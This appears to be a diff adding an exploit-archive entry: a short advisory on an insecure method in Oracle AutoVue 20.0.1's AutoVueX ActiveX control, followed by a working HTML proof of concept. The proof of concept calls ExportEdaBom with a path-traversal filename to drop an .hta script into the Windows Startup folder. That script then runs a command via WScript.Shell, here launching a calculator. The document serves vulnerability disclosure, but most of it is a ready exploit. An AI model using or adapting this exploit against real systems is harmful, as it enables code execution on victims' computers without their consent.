@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/50332/info
+
+Oracle AutoVue 'AutoVueX.ocx' ActiveX control is prone to a vulnerability caused by an insecure method.
+
+Successfully exploiting this issue will allow attackers to create or overwrite arbitrary files on a victim's computer within the context of the affected application (typically Internet Explorer) that uses the ActiveX control.
+
+Oracle AutoVue 20.0.1 is vulnerable; other versions may also be affected. 
+
+<!--
+Oracle AutoVue AutoVueX ActiveX Control ExportEdaBom Remote Code Execution 
+
+ProgID: AUTOVUEX.AutoVueXCtrl.1
+CLSID: {B6FCC215-D303-11D1-BC6C-0000C078797F}
+Binary path: C:\PROGRA~1\av\avwin\AutoVueX.ocx
+Safe for initialization (registry): true
+Safe for scripting (registry): true
+
+rgod
+-->
+<!-- saved from url=(0014)about:internet --> 
+<html>
+<object classid='clsid:B6FCC215-D303-11D1-BC6C-0000C078797F' id='obj' width=640 & height=480 />
+<param name=SRC value="PADS_Evaluation_board.pcb"></param>
+</object>
+<script defer="defer">
+var sh = "<" + "SCRIPT> var x=new ActiveXObject(\"WScript.Shell\"); x.Exec(\"CALC.EXE\"); <" +"/SCRIPT>";
+for (i=0; i<6666; i++) { 
+    obj.ExportEdaBom("../../../../../../../../../../../Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\sh.hta","aaaa",true,sh);
+}
+window.location.href = window.location.href;
+</script>
